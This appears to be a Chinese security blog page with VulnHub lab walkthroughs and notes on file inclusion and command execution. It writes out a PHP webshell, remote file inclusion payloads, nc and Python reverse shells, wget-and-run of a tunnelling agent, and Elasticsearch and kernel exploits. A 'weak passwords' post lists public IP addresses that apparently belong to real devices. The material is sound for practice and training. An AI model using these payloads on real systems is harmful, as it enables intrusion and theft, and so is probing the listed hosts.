<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240130155503184.png" alt="image-20240130155503184"></p>
<p><a target="_blank" rel="noopener" href="http://2.44.62.125/web/index.html">http://2.44.62.125/web/index.html</a></p>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240130155717662.png" alt="image-20240130155717662"></p>
<p><a target="_blank" rel="noopener" href="http://87.11.145.204/web/index.html">http://87.11.145.204/web/index.html</a></p>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240130155834408.png" alt="image-20240130155834408"></p>
<p><a target="_blank" rel="noopener" href="http://113.183.173.183/web/index.html">http://113.183.173.183/web/index.html</a></p>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240130162645849.png" alt="image-20240130162645849"></p>
<p><a target="_blank" rel="noopener" href="http://14.227.175.7/web/index.html">http://14.227.175.7/web/index.html</a></p>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240130162616309.png" alt="image-20240130162616309"></p>
<p><a target="_blank" rel="noopener" href="http://113.180.28.58/web/index.html">http://113.180.28.58/web/index.html</a></p>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240130170620677.png" alt="image-20240130170620677"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/31/%E5%BC%B1%E5%AF%86%E7%A0%81/" data-id="cltmognau00049wu4f6wxg067" class="article-share-link">分享</a>
      
      
    </footer>
  </div>
  
</article>




  
    <article id="post-vulnhub靶机-MoriartyCorp" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2024/01/26/vulnhub%E9%9D%B6%E6%9C%BA-MoriartyCorp/" class="article-date">
  <time class="post-time" datetime="2024-01-26T01:18:04.000Z" itemprop="datePublished">
    <span class="post-month">1月</span><br/>
    <span class="post-day">26</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/26/vulnhub%E9%9D%B6%E6%9C%BA-MoriartyCorp/">vulnhub靶机-MoriartyCorp（文件包含）</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/boredhackerblog-moriarty-corp,456/">https://www.vulnhub.com/entry/boredhackerblog-moriarty-corp,456/</a></p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><ol>
<li><strong>ip扫描</strong></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I rth0</span><br></pre></td></tr></table></figure>

<p>然后根据靶机的ipv6地址找到靶机ip</p>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240126091936057.png" alt="image-20240126091936057"></p>
<ol start="2">
<li><strong>端口扫描</strong></li>
</ol>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240126092304158.png" alt="image-20240126092304158"></p>
<ol start="3">
<li><strong>发现8000端口，直接浏览器访问，这里提示说要开始任务就得先输入flag{start}，然后提交</strong></li>
</ol>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240126092622531.png" alt="image-20240126092622531"></p>
<h3 id="第一个flag（文件包含）"><a href="#第一个flag（文件包含）" class="headerlink" title="第一个flag（文件包含）"></a>第一个flag（文件包含）</h3><ol>
<li><strong>根据提示打开80端口</strong></li>
</ol>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240126093116930.png" alt="image-20240126093116930"></p>
<p>发现可能含有文件包含漏洞</p>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240126093149376.png" alt="image-20240126093149376"></p>
<ol start="2">
<li><strong>尝试文件包含</strong></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.164/?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240126094446223.png" alt="image-20240126094446223"></p>
<p>可以进行文件包含。</p>
<ol start="3">
<li><strong>上传一句话木马，并用蚁剑进行链接</strong></li>
</ol>
<p>在kali网站根目录下创建文件shell.txt,写一个一句话代码。根目录是在&#x2F;var&#x2F;www&#x2F;html下，默认端口是80。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_REQUEST[&#x27;a&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>

<p>开启kali的apache服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>

<p>打开网站测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.164/?file=http://192.168.2.77/shell.txt&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>

<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240126111559612.png" alt="image-20240126111559612"></p>
<p>用蚁剑进行链接</p>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240126111808913.png" alt="image-20240126111808913"></p>
<p>进入目录，可以在根目录的最下面找到一个1_flag.txt</p>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240126111925982.png" alt="image-20240126111925982"></p>
<h4 id="第一个flag（反弹shell）"><a href="#第一个flag（反弹shell）" class="headerlink" title="第一个flag（反弹shell）"></a>第一个flag（反弹shell）</h4><p>知道网站含有文件包含漏洞后，尝试进行反弹shell。</p>
<p>kali中开启4444端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc lvvp 4444</span><br></pre></td></tr></table></figure>

<pre><code>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.164/?file=data://text/plain,&lt;?php $a=$_GET[&quot;abc&quot;];exec($a);echo $a;?&gt;&amp;abc=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+192.168.2.77+4444+&gt;/tmp/f</span><br></pre></td></tr></table></figure>
</code></pre>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/26/vulnhub%E9%9D%B6%E6%9C%BA-MoriartyCorp/" data-id="cltmognas00039wu49cvnfd0o" class="article-share-link">分享</a>
      
      
    </footer>
  </div>
  
</article>




  
    <article id="post-文件包含" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2024/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
  <time class="post-time" datetime="2024-01-25T06:11:33.000Z" itemprop="datePublished">
    <span class="post-month">1月</span><br/>
    <span class="post-day">25</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	if ($_GET[page])&#123;</span><br><span class="line">		include $_GET[page];</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">	include &quot;home.php&quot;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>查后台index.php的源码，要进行base64解码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=php://filter/convert.base64-encode/resource=index.php</span><br><span class="line">?a=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240125145309574.png" alt="image-20240125145309574"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://input </span><br><span class="line">&lt;?php system(&quot;echo 123 &gt;&gt; wo/2.txt&quot;); ?&gt;</span><br></pre></td></tr></table></figure>

<p>data:text&#x2F;plain,<?php phpinfo();?></p>
<p>data:&#x2F;&#x2F;text&#x2F;plain;base64,dGhlIHVzZXIgaXMgYWRtaW4 </p>
<p>读文件</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/wo/abc.php?a=file://C:%5Cphpstudy_pro%5CWWW%5Cflash.js">http://127.0.0.1/wo/abc.php?a=file://C:\phpstudy_pro\WWW\flash.js</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" data-id="cltmognau00059wu48xcfggmc" class="article-share-link">分享</a>
      
      
    </footer>
  </div>
  
</article>




  
    <article id="post-1-medium-socnet-ova靶机" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2024/01/24/1-medium-socnet-ova%E9%9D%B6%E6%9C%BA/" class="article-date">
  <time class="post-time" datetime="2024-01-24T06:15:58.000Z" itemprop="datePublished">
    <span class="post-month">1月</span><br/>
    <span class="post-day">24</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/24/1-medium-socnet-ova%E9%9D%B6%E6%9C%BA/">1.medium_socnet.ova靶机easy_cloudantivirus靶机渗透练习</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="1-medium-socnet-ova靶机"><a href="#1-medium-socnet-ova靶机" class="headerlink" title="1.medium_socnet.ova靶机"></a>1.medium_socnet.ova靶机</h3><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/boredhackerblog/medium_socnet.ova">https://download.vulnhub.com/boredhackerblog/medium_socnet.ova</a></p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p><strong>1.ip扫描</strong></p>
<p>根据ipv6定位到靶机ip</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth0</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124195919487.png" alt="image-20240124195919487"></p>
<p><strong>2.端口扫描</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.2.126</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124200017169.png" alt="image-20240124200017169"></p>
<p><strong>3.尝试登入端口</strong></p>
<p>可以登入192.168.2.126:5000</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124200131272.png" alt="image-20240124200131272"></p>
<p><strong>4.目录扫描</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124200738702.png" alt="image-20240124200738702"></p>
<p><strong>5.查看网页192.168.2.126:5000&#x2F;admin</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;whoami&#x27;</span><br></pre></td></tr></table></figure>

<p>可以执行命令，可以进行反弹shell。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124201155904.png" alt="image-20240124201155904"></p>
<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>kali输入下面代码，进行监听端口4444.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>

<p>网页输入，进行反弹shell。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c &quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.2.77&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124202420622.png" alt="image-20240124202420622"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124202829358.png" alt="image-20240124202829358"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124202930956.png" alt="image-20240124202930956"></p>
<h4 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h4><ol>
<li>内网扫描</li>
</ol>
<ul>
<li>ip address 发现内网段为172.17.0.3&#x2F;16网段</li>
<li>内网主机扫描，发现172.17.0.1，172.17.0.2，172.17.0.3为存活主机</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(seq 1 254); do ping -c 1 172.17.0.$i; done</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>部署Venom内网穿透工具</li>
</ol>
<ul>
<li>在Kali主机Venom目录启动Python3 Http Server</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>启动Venom管理端，监听本地9999端口</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./admin_linux_x64 -lport 9999</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124203922451.png" alt="image-20240124203922451"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget -c http://192.168.2.77/agent_linux_x86</span><br><span class="line">chmod +x agent_linux_x86</span><br><span class="line">./agent_linux_x86 -rhost 192.168.2.77 -rport 9999</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imga54a489a6a00f977d79e47e3697441f.png" alt="a54a489a6a00f977d79e47e3697441f"></p>
<p>执行完后</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//img27c807bbd7893c4a017766ed6887dc5.png" alt="27c807bbd7893c4a017766ed6887dc5"></p>
<ol start="4">
<li>查看、控制Venom节点、启动socks隧道</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show</span><br><span class="line">goto 1</span><br><span class="line">socks 1090</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124204523220.png" alt="image-20240124204523220"></p>
<h4 id="挂Socks内网扫描"><a href="#挂Socks内网扫描" class="headerlink" title="挂Socks内网扫描"></a>挂Socks内网扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/proxychains4.conf</span><br><span class="line">修改最后一行为：</span><br><span class="line">socks5  127.0.0.1 1080</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124204752824.png" alt="image-20240124204752824"></p>
<p>挂代理启动扫描，发现172.17.0.1，172.17.0.3相同，172.17.0.2存在9200端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -Pn -sT -sV 172.17.0.1</span><br><span class="line">proxychains4 nmap -Pn -sT -sV 172.17.0.2</span><br><span class="line">proxychains4 nmap -Pn -sT -sV 172.17.0.3</span><br></pre></td></tr></table></figure>

<p>可以扫到proxychains4 nmap -p 9200 -Pn -sT -sV 172.17.0.2</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124204952107.png" alt="image-20240124204952107"></p>
<h4 id="利用Elasticsearch获取目标靶机登录用户名和密码"><a href="#利用Elasticsearch获取目标靶机登录用户名和密码" class="headerlink" title="利用Elasticsearch获取目标靶机登录用户名和密码"></a>利用Elasticsearch获取目标靶机登录用户名和密码</h4><p>搜索Elasticsearch漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Elasticsearch</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124205112105.png" alt="image-20240124205112105"></p>
<p>1.4.2版本可以使用第6个</p>
<ol>
<li>复制36337.py到当前目录，通过查看该python脚本得知该使用python2</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/remote/36337.py .</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>向Elasticsearch写入一条数据（如果不写入数据，攻击代码无法执行）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl -XPOST &#x27;172.17.0.2:9200/twitter/user/yren&#x27; -d &#x27;&#123;&quot;name&quot;:&quot;Sun&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>挂proxychains攻击172.17.0.2 9200端口</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python2 36337.py  172.17.0.2</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124205513278.png" alt="image-20240124205513278"></p>
<p>在根目录下发现passwords文件，内含用户名一些用户名和密码</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//img6c1ac45a5ad8189a946af2bc44c194b.png" alt="6c1ac45a5ad8189a946af2bc44c194b"></p>
<ol start="4">
<li>破解MD5加密明文</li>
</ol>
<p>可以获得一个用户：</p>
<p>john：1337hack</p>
<ol start="5">
<li>通过依次尝试，john:1337hack可以登录目标靶机</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh john@192.168.2.126</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124205954036.png" alt="image-20240124205954036"></p>
<h4 id="Linux内核提权"><a href="#Linux内核提权" class="headerlink" title="Linux内核提权"></a>Linux内核提权</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>

<p>提权失败</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124210139829.png" alt="image-20240124210139829"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 3.13.0</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124210517261.png" alt="image-20240124210517261"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/37292.c .</span><br><span class="line">注释掉37292.c的139-147行</span><br><span class="line">vim 37292.c</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124210803288.png" alt="image-20240124210803288"></p>
<p>docker镜像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker pull homebrew/ubuntu16.04</span><br><span class="line">docker run -itd --name ubuntu16.04 homebrew/ubuntu16.04 /bin/bash</span><br><span class="line">docker exec -it ubuntu16.04 /bin/bash</span><br><span class="line">docker images //查看docker镜像</span><br><span class="line">docker ps //查看现在有哪些容器</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124211831780.png" alt="image-20240124211831780"></p>
<p>复制37292.c文件到容器中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker cp 37292.c ubuntu16.04:/root/</span><br><span class="line">docker exec -it ubuntu16.04 /bin/bash</span><br><span class="line">sudo su</span><br><span class="line">cd /root</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124212046458.png" alt="image-20240124212046458"></p>
<p>编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o exp 37292.c</span><br><span class="line">exit</span><br><span class="line">docker cp ubuntu16.04:/root/exp /tmp</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124212305672.png" alt="image-20240124212305672"></p>
<p>查找ofs-lib.so</p>
<p>复制ofs-lib.so文件到当前目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">locate ofs-lib.so</span><br><span class="line">cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so .</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124212619880.png" alt="image-20240124212619880"></p>
<ul>
<li>将编译好的exp和ofs-lib.so上传至目标靶机</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali主机在tmp目录启动http server</span><br><span class="line">python3 -m http.server 80</span><br><span class="line"></span><br><span class="line">在靶机上下载exp和ofs-lib.so</span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.2.77/exp</span><br><span class="line">wget http://192.168.2.77/ofs-lib.so</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240125102359973.png" alt="image-20240125102359973"></p>
<h3 id="easy-cloudantivirus靶机渗透练习"><a href="#easy-cloudantivirus靶机渗透练习" class="headerlink" title="easy_cloudantivirus靶机渗透练习"></a>easy_cloudantivirus靶机渗透练习</h3>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/24/1-medium-socnet-ova%E9%9D%B6%E6%9C%BA/" data-id="cltmognam00009wu4d00mgffk" class="article-share-link">分享</a>
      
      
    </footer>
  </div>
  
</article>




  
    <article id="post-命令执行" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2024/01/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
  <time class="post-time" datetime="2024-01-19T06:25:24.000Z" itemprop="datePublished">
    <span class="post-month">1月</span><br/>
    <span class="post-day">19</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行和代码执行</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>chmod +x .&#x2F;*</p>
<p>import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.2.77”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([“&#x2F;bin&#x2F;sh”,”-i”]);</p>
<h3 id="windows命令执行"><a href="#windows命令执行" class="headerlink" title="windows命令执行"></a>windows命令执行</h3><p>命令执行php：</p>
<p><strong>system(),passthru(),exec(),&#96;&#96;</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">passthru(&#x27;whoami&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?pp</span><br><span class="line">echo exec(&#x27;whoami&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$_GET(&#x27;a&#x27;);</span><br><span class="line">system(&#x27;whoami&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?pp</span><br><span class="line">echo `whoami`;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>二次注入</strong></p>
<p>网页输入的a进行了限制，可以选择二次注入。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=eval($_GET[a]);&amp;a=system(&quot;tac flag.p?p&quot;);</span><br></pre></td></tr></table></figure>

<h4 id="Windows命令连接符"><a href="#Windows命令连接符" class="headerlink" title="Windows命令连接符"></a><strong>Windows命令连接符</strong></h4><p>“&amp;”命令前面的语句为假，则直接执行后面的;前面的语句为真，命令都执行。</p>
<p>“&amp;&amp;”前面的语句为假，则直接出错，后面的也不执行;前面为真，都执行。</p>
<p>“|”前面命令正确，直接执行后面的语句;前面的语句为假，则直接出错，后面的也不执行。</p>
<p>“||”前面出错，执行后面的;前面不出错，不会只执行前面的，不执行后面的命令。</p>
<p><strong>Linux下的命令连接符</strong>包括“;”、“&amp;”、“&amp;&amp;”、“I”、“Il”。</p>
<p>“:”分号操作符使多个命令顺序执行，前面命令和后面命令的都会执行。</p>
<p>“&amp;”和号操作符,作用是使命令在后台运行,这样就可以同时执行多条命令。</p>
<p>“&amp;&amp;”与操作符,第一个命令执行成功，执行第二个命令。</p>
<p>“|”管道操作符，将第一个命令的输出作为第二个命令的输入，前面跟后面的都会执行，但是只显示后面的执行结果。</p>
<p>“||”或操作符，类似于编程中的 if else语句。前面的命令执行成功后面的命令不会执行，前面的命令执行失败后面的命令会执行。</p>
